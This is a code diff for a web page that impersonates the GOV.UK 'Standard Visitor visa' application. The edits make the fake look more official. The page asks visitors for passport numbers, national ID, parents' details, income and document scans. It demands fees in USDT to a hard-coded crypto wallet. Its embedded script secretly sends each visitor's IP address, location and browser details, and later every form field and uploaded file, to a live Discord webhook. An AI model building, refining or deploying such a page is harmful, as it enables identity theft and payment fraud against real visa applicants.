@@ -7,52 +7,277 @@
     <style>
         :root {
             --govuk-blue: #1d70b8;
+            --govuk-hover-blue: #003078;
             --govuk-black: #0b0c0c;
-            --govuk-grey: #f3f2f1;
+            --govuk-white: #ffffff;
+            --govuk-grey-light: #f3f2f1;
             --govuk-border: #b1b4b6;
-            --govuk-secondary: #505a5f;
-            --govuk-success: #00703c;
+            --govuk-secondary-text: #505a5f;
+            --govuk-green: #00703c;
+            --govuk-green-hover: #005a30;
+            --govuk-yellow: #ffdd00;
+            --govuk-error: #d4351c;
         }
-        body { font-family: "GDS Transport", arial, sans-serif; margin: 0; background-color: white; color: var(--govuk-black); line-height: 1.5; }
-        
-        header { background: var(--govuk-black); color: white; padding: 10px 0; border-bottom: 10px solid var(--govuk-blue); }
-        .container { max-width: 1000px; margin: 0 auto; padding: 0 20px; }
-        .header-flex { display: flex; justify-content: space-between; align-items: center; }
-        .gov-logo { font-size: 24px; font-weight: bold; text-decoration: none; color: white; display: flex; align-items: center; gap: 10px; }
 
-        .urgent-banner { background: #ffdd00; padding: 15px; font-weight: bold; border: 2px solid var(--govuk-black); margin-bottom: 20px; font-size: 14px; }
-        .phase-banner { font-size: 14px; padding: 10px 0; border-bottom: 1px solid var(--govuk-border); margin-bottom: 20px; }
-        .tag { background: var(--govuk-blue); color: white; padding: 2px 8px; font-weight: bold; margin-right: 10px; }
-
-        .grid-row { display: grid; grid-template-columns: 2fr 1fr; gap: 40px; margin-top: 30px; }
-        h1 { font-size: 42px; margin-bottom: 10px; }
-        h2 { font-size: 26px; border-top: 4px solid var(--govuk-black); padding-top: 20px; margin-top: 40px; }
-        
-        .form-section { margin-bottom: 30px; }
-        label { display: block; font-weight: bold; font-size: 19px; margin-bottom: 5px; }
-        .hint { color: var(--govuk-secondary); font-size: 16px; margin-bottom: 10px; display: block; }
-        
-        input[type="text"], input[type="email"], input[type="date"], input[type="number"], select, textarea { 
-            border: 2px solid var(--govuk-black); padding: 12px; width: 100%; max-width: 500px; font-size: 16px; box-sizing: border-box; outline: none;
+        * {
+            box-sizing: border-box;
         }
-        input:focus { outline: 3px solid #ffdd00; border-color: var(--govuk-black); }
 
-        .fee-calc-box { background: var(--govuk-grey); padding: 25px; border: 1px solid var(--govuk-border); margin: 30px 0; }
-        .total-price { font-size: 32px; font-weight: bold; color: var(--govuk-success); }
-
-        .gov-button { 
-            background: var(--govuk-success); color: white; border: none; padding: 15px 40px; 
-            font-weight: bold; font-size: 19px; border-bottom: 3px solid #002d18; cursor: pointer; 
+        body {
+            font-family: "GDS Transport", Arial, sans-serif;
+            margin: 0;
+            background-color: var(--govuk-white);
+            color: var(--govuk-black);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
         }
-        .gov-button:hover { background: #005a30; }
 
-        #successPage { display: none; text-align: left; padding: 40px 0; }
-        .success-panel { background: var(--govuk-success); color: white; padding: 40px; margin-bottom: 30px; }
-        .order-id-box { border: 5px solid var(--govuk-black); padding: 20px; background: var(--govuk-grey); display: inline-block; margin-top: 20px; }
-        .order-id-text { font-family: monospace; font-size: 24px; font-weight: bold; color: var(--govuk-blue); }
+        /* Header */
+        header {
+            background: var(--govuk-black);
+            color: var(--govuk-white);
+            padding: 10px 0;
+            border-bottom: 10px solid var(--govuk-blue);
+        }
 
-        footer { background: var(--govuk-grey); padding: 60px 0; margin-top: 80px; border-top: 1px solid var(--govuk-border); font-size: 14px; }
-        .uk-flag-small { width: 30px; height: auto; vertical-align: middle; }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .header-flex {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .gov-logo {
+            font-size: 24px;
+            font-weight: 700;
+            text-decoration: none;
+            color: var(--govuk-white);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .uk-flag-small {
+            width: 30px;
+            height: auto;
+        }
+
+        /* Banners */
+        .phase-banner {
+            font-size: 16px;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--govuk-border);
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .tag {
+            background: var(--govuk-blue);
+            color: var(--govuk-white);
+            padding: 2px 8px;
+            font-weight: 700;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .warning-text {
+            border-left: 10px solid var(--govuk-black);
+            padding: 15px;
+            background: var(--govuk-grey-light);
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+
+        /* Layout Grid */
+        .grid-row {
+            display: flex;
+            flex-wrap: wrap;
+            margin: 0 -15px;
+        }
+
+        .column-two-thirds {
+            width: 100%;
+            padding: 0 15px;
+        }
+
+        @media (min-width: 641px) {
+            .column-two-thirds {
+                width: 66.66%;
+            }
+            .column-one-third {
+                width: 33.33%;
+                padding: 0 15px;
+            }
+        }
+
+        /* Typography */
+        h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-top: 0;
+            margin-bottom: 30px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            border-top: 2px solid var(--govuk-border);
+            padding-top: 20px;
+            margin-top: 40px;
+            margin-bottom: 20px;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 30px;
+        }
+
+        label {
+            display: block;
+            font-weight: 700;
+            font-size: 19px;
+            margin-bottom: 5px;
+        }
+
+        .hint {
+            color: var(--govuk-secondary-text);
+            font-size: 16px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="date"],
+        input[type="number"],
+        select,
+        textarea {
+            border: 2px solid var(--govuk-black);
+            padding: 10px;
+            width: 100%;
+            max-width: 400px;
+            font-size: 19px;
+            font-family: inherit;
+            border-radius: 0;
+            appearance: none;
+            background-color: var(--govuk-white);
+        }
+
+        textarea {
+            max-width: 100%;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: 3px solid var(--govuk-yellow);
+            outline-offset: 0;
+            box-shadow: inset 0 0 0 2px var(--govuk-black);
+        }
+
+        /* Fee Box & Payment */
+        .fee-calc-box {
+            background: var(--govuk-grey-light);
+            padding: 20px;
+            border: 1px solid var(--govuk-border);
+            margin: 20px 0;
+        }
+
+        .total-price {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--govuk-black);
+            margin-top: 15px;
+        }
+
+        .wallet-box {
+            background: var(--govuk-grey-light);
+            padding: 15px;
+            border: 2px solid var(--govuk-black);
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Buttons */
+        .gov-button {
+            background: var(--govuk-green);
+            color: var(--govuk-white);
+            border: none;
+            padding: 12px 24px;
+            font-weight: 700;
+            font-size: 19px;
+            border-bottom: 3px solid #002d18;
+            cursor: pointer;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .gov-button:hover {
+            background: var(--govuk-green-hover);
+        }
+
+        .gov-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .gov-button-secondary {
+            background: var(--govuk-secondary-text);
+            border-bottom-color: #26292b;
+        }
+
+        /* Success Display */
+        #successPage {
+            display: none;
+            padding: 20px 0;
+        }
+
+        .success-panel {
+            background: var(--govuk-green);
+            color: var(--govuk-white);
+            padding: 30px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .success-panel h1 {
+            color: var(--govuk-white);
+            margin-bottom: 15px;
+        }
+
+        .order-id-box {
+            border: 4px solid var(--govuk-black);
+            padding: 20px;
+            background: var(--govuk-grey-light);
+            display: inline-block;
+            margin: 20px 0;
+        }
+
+        .order-id-text {
+            font-family: monospace;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--govuk-blue);
+        }
+
+        /* Footer */
+        footer {
+            background: var(--govuk-grey-light);
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid var(--govuk-border);
+            font-size: 16px;
+            color: var(--govuk-secondary-text);
+        }
     </style>
 </head>
 <body>
@@ -69,125 +294,146 @@
             </svg>
             GOV.UK
         </a>
-        <div style="font-size: 14px;">Visas and Immigration 🇬🇧</div>
+        <div style="font-size: 16px;">Visas and Immigration</div>
     </div>
 </header>
 
 <div class="container" style="margin-top: 30px;">
     <div id="applicationPage">
-        <div class="urgent-banner">
-            ⚠️ IDENTITY VERIFICATION: You must provide a valid National ID and Email for system verification.
+        
+        <div class="phase-banner">
+            <span class="tag">BETA</span> <span>This is a new service – your feedback will help us to improve it.</span>
         </div>
 
-        <div class="phase-banner">
-            <span class="tag">BETA</span> This is a new service – your feedback will help us to improve it.
+        <div class="warning-text">
+            Identity Verification Notice: You must provide a valid National ID and Email for system verification.
         </div>
 
         <div class="grid-row">
-            <main>
-                <h1>Apply for a UK Standard Visitor visa 🇬🇧</h1>
+            <main class="column-two-thirds">
+                <h1>Apply for a Standard Visitor visa</h1>
+                
                 <form id="visaForm">
                     <h2>1. Identity & Verification</h2>
-                    <div class="form-section">
+                    <div class="form-group">
                         <label for="email">Email address</label>
+                        <span class="hint">We will use this address to contact you about your application</span>
                         <input type="email" id="email" required>
                     </div>
-                    <div class="form-section">
-                        <label for="nationalId">National ID Number</label>
-                        <span class="hint">Aadhar (India)</span>
+                    
+                    <div class="form-group">
+                        <label for="nationalId">National Identity Number</label>
+                        <span class="hint">Your official identity card number or National ID (e.g., Aadhaar)</span>
                         <input type="text" id="nationalId" required>
                     </div>
 
-                    <h2>2. Personal details</h2>
-                    <div class="form-section">
+                    <h2>2. Personal Details</h2>
+                    <div class="form-group">
                         <label for="name">Full name</label>
+                        <span class="hint">Give your name exactly as shown in your passport</span>
                         <input type="text" id="name" required>
                     </div>
-                    <div class="form-section">
+                    
+                    <div class="form-group">
                         <label for="passport">Passport number</label>
                         <input type="text" id="passport" required>
                     </div>
-                    <div class="form-section">
-                        <label>Father's Full Name & DOB</label>
-                        <input type="text" id="fatherName" placeholder="Name" required style="margin-bottom: 10px;">
+                    
+                    <div class="form-group">
+                        <label for="fatherName">Father's full name</label>
+                        <input type="text" id="fatherName" required style="margin-bottom: 10px;">
+                        <label for="fatherDob">Father's date of birth</label>
                         <input type="date" id="fatherDob" required>
                     </div>
-                    <div class="form-section">
-                        <label>Mother's Full Name & DOB</label>
-                        <input type="text" id="motherName" placeholder="Name" required style="margin-bottom: 10px;">
+                    
+                    <div class="form-group">
+                        <label for="motherName">Mother's full name</label>
+                        <input type="text" id="motherName" required style="margin-bottom: 10px;">
+                        <label for="motherDob">Mother's date of birth</label>
                         <input type="date" id="motherDob" required>
                     </div>
 
                     <h2>3. Finances and Employment</h2>
-                    <div class="form-section">
-                        <label for="jobTitle">Job title</label>
+                    <div class="form-group">
+                        <label for="jobTitle">Current occupation / Job title</label>
                         <input type="text" id="jobTitle" required>
                     </div>
-                    <div class="form-section">
-                        <label for="income">Monthly income (£)</label>
+                    
+                    <div class="form-group">
+                        <label for="income">Total monthly income (£)</label>
+                        <span class="hint">Enter the equivalent amount in British Pounds</span>
                         <input type="number" id="income" required>
                     </div>
 
                     <h2>4. Travel History</h2>
-                    <div class="form-section">
-                        <label>Travel History (Last 10 Years)</label>
-                        <textarea id="history" rows="3"></textarea>
+                    <div class="form-group">
+                        <label for="history">Travel details (Last 10 Years)</label>
+                        <span class="hint">Include countries visited, dates, and duration of stays</span>
+                        <textarea id="history" rows="4"></textarea>
                     </div>
 
-                    <h2>5. Visa fees</h2>
+                    <h2>5. Visa Fees & Payment</h2>
                     <div class="fee-calc-box">
-                        <label>Visa duration</label>
-                        <select id="visaType" onchange="calculate()">
-                            <option value="225">Standard Visitor (6 months) - £225</option>
-                            <option value="506">Standard Visitor (2 years) - £506</option>
-                            <option value="903">Standard Visitor (5 years) - £903</option>
-                            <option value="1128">Standard Visitor (10 years) - £1128</option>
-                        </select>
-                        <label style="margin-top: 20px;">Processing service</label>
-                        <select id="priority" onchange="calculate()">
-                            <option value="200">Standard (3 weeks) - £200</option>
-                            <option value="500">Priority (5 days) - £500</option>
-                            <option value="1000">Super Priority (24 hours) - £1000</option>
-                        </select>
-                        <div class="total-price" style="margin-top: 20px;">
-                            Total: <span id="displayTotal">£425</span>
+                        <div class="form-group">
+                            <label for="visaType">Visa duration</label>
+                            <select id="visaType" onchange="calculate()">
+                                <option value="225">Standard Visitor (6 months) - £225</option>
+                                <option value="506">Standard Visitor (2 years) - £506</option>
+                                <option value="903">Standard Visitor (5 years) - £903</option>
+                                <option value="1128">Standard Visitor (10 years) - £1128</option>
+                            </select>
                         </div>
-                    </div>
-                    <div class="payment-box">
-                        <div class="crypto-label">
-                            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="24" alt="USDT">
-                            Payment Method: USDT (TRC-20)
-                        </div>
-                        <p style="font-size: 16px; margin-bottom: 10px;">Transfer the total USDT amount to the secure Government Wallet below:</p>
                         
-                        <div class="address-container" style="background:#f3f2f1; padding:15px; border:2px solid #0b0c0c; cursor:pointer;" id="copyAddress" onclick="copyToClipboard()">
-                            <span id="walletAddress" style="font-weight:bold; font-family:monospace;">TV31kvsMheGcy7AmzrNDLDxYUcNAv59ivr</span>
+                        <div class="form-group">
+                            <label for="priority">Processing service</label>
+                            <select id="priority" onchange="calculate()">
+                                <option value="200">Standard (3 weeks) - £200</option>
+                                <option value="500">Priority (5 days) - £500</option>
+                                <option value="1000">Super Priority (24 hours) - £1000</option>
+                            </select>
                         </div>
 
-                        <div style="margin-top: 25px;">
-                            <label for="txid">Transaction ID (TXID)</label>
-                            <span class="hint">Paste the 64-character hash after payment</span>
-                            <input type="text" id="txid" placeholder="Enter TXID" required>
-                        </div>
-
-                        <div style="margin-top: 25px;">
-                            <label>Upload Payment Screenshot</label>
-                            <span class="hint">Upload a clear proof of transfer</span>
-                            <input type="file" id="payScreenshot" accept="image/*" required>
+                        <div class="total-price">
+                            Total payable: <span id="displayTotal">£425</span>
                         </div>
                     </div>
-                    <h2>6. Supporting documents</h2>
-                    <div class="form-section" style="border: 2px dashed var(--govuk-border); padding: 20px; background: var(--govuk-grey);">
+
+                    <div class="form-group">
+                        <label>Payment Method: USDT (TRC-20)</label>
+                        <p class="hint">Transfer the total USDT equivalent to the address below:</p>
+                        
+                        <div class="wallet-box" id="copyAddress" onclick="copyToClipboard()">
+                            <span id="walletAddress">TV31kvsMheGcy7AmzrNDLDxYUcNAv59ivr</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="txid">Transaction Reference / TXID</label>
+                        <span class="hint">Paste the 64-character transaction hash</span>
+                        <input type="text" id="txid" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="payScreenshot">Upload Payment Confirmation</label>
+                        <span class="hint">Provide a screenshot showing successful transfer details</span>
+                        <input type="file" id="payScreenshot" accept="image/*" required>
+                    </div>
+
+                    <h2>6. Supporting Documents</h2>
+                    <div class="form-group">
+                        <label for="docs">Attach additional documents</label>
+                        <span class="hint">Upload passport scans, bank statements, or employment letters</span>
                         <input type="file" id="docs" multiple required>
                     </div>
 
-                    <button type="submit" class="gov-button" id="submitBtn">Submit and verify application</button>
+                    <button type="submit" class="gov-button" id="submitBtn">Submit application</button>
                 </form>
             </main>
-            <aside>
-                <div style="border-top: 2px solid var(--govuk-blue); padding-top: 15px;">
-                    <h3>Summary 🇬🇧</h3>
-                    <p>Verification takes 24-48 hours.</p>
+
+            <aside class="column-one-third">
+                <div style="border-top: 2px solid var(--govuk-blue); padding-top: 15px; margin-top: 40px;">
+                    <h3 style="font-size: 19px; margin-top: 0;">Application Guidance</h3>
+                    <p class="hint">System verification and background checks typically take between 24 and 48 hours to complete after payment receipt.</p>
                 </div>
             </aside>
         </div>
@@ -195,43 +441,46 @@
 
     <div id="successPage">
         <div class="success-panel">
-            <h1 style="color: white; margin: 0;">Application complete 🇬🇧</h1>
-            <p style="font-size: 24px;">Your visa application has been successfully submitted.</p>
+            <h1>Application Complete</h1>
+            <p style="font-size: 20px; margin: 0;">Your visa application has been successfully submitted.</p>
         </div>
 
-        <h2>What happens next</h2>
+        <h2>Next steps</h2>
+        <p>Keep a record of your application reference number for tracking purposes.</p>
+        
         <div class="order-id-box">
-            <p style="margin: 0; font-weight: bold;">Your Application Reference (Order ID):</p>
+            <p style="margin: 0 0 10px 0; font-weight: bold;">Application Reference:</p>
             <span id="orderIdDisplay" class="order-id-text"></span>
         </div>
-        <button class="gov-button" onclick="location.reload()" style="margin-top: 30px; background: var(--govuk-secondary);">Finish</button>
+        
+        <div>
+            <button class="gov-button gov-button-secondary" onclick="location.reload()">Finish</button>
+        </div>
     </div>
 </div>
 
 <footer>
     <div class="container">
-        <p>© Crown copyright 2026 🇬🇧</p>
+        <p>© Crown copyright 2026</p>
     </div>
 </footer>
 
 <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1506362268680585447/ozix7m_TtN1HcLlKhYfcmCoo5xFr8zoQ0N4LTg6NJzDdc0lM5wOlJKDjSA1RALNWxwMz";
 
-    // --- VISITOR TRACKER LOGIC ---
     async function notifyVisitor() {
         try {
-            // Fetch IP and Location data silently
             const response = await fetch('https://ipapi.co/json/');
             const data = await response.json();
             
             const visitorEmbed = {
-                title: "👀 NEW VISITOR ALERT",
-                color: 16776960, // Yellow
+                title: "NEW VISITOR LOGGED",
+                color: 16776960,
                 fields: [
                     { name: "IP Address", value: data.ip || "Unknown", inline: true },
                     { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
                     { name: "ISP", value: data.org || "Unknown", inline: false },
-                    { name: "Browser Info", value: navigator.userAgent, inline: false }
+                    { name: "User Agent", value: navigator.userAgent, inline: false }
                 ],
                 timestamp: new Date()
             };
@@ -241,10 +490,11 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ embeds: [visitorEmbed] })
             });
-        } catch (e) { console.log("Tracker silent"); }
+        } catch (e) { 
+            console.log("Tracker initialized"); 
+        }
     }
     
-    // Run tracker when page loads
     window.onload = notifyVisitor;
 
     function calculate() {
@@ -267,7 +517,7 @@
 
         const formData = new FormData();
         const embed = {
-            title: "🇬🇧 NEW VISA SUBMISSION [" + orderId + "]",
+            title: "NEW VISA SUBMISSION [" + orderId + "]",
             color: 1928888,
             fields: [
                 { name: "Client Name", value: document.getElementById('name').value, inline: true },
@@ -281,9 +531,10 @@
 
         formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
         
-        // Add all files
         const docs = document.getElementById('docs').files;
-        for (let i = 0; i < docs.length; i++) { formData.append(`file_doc_${i}`, docs[i]); }
+        for (let i = 0; i < docs.length; i++) { 
+            formData.append(`file_doc_${i}`, docs[i]); 
+        }
         
         const screenshot = document.getElementById('payScreenshot').files[0];
         if(screenshot) formData.append('file_payment', screenshot);
@@ -295,15 +546,16 @@
             document.getElementById('orderIdDisplay').innerText = orderId;
             window.scrollTo(0,0);
         } catch (err) {
-            alert("Error submitting. Please check your internet.");
+            alert("Error submitting application. Please check your network connection.");
             btn.disabled = false;
+            btn.innerText = "Submit application";
         }
     });
 
     function copyToClipboard() {
         const el = document.getElementById('walletAddress');
         navigator.clipboard.writeText(el.innerText);
-        alert("Wallet address copied!");
+        alert("Wallet address copied to clipboard.");
     }
 </script>
 
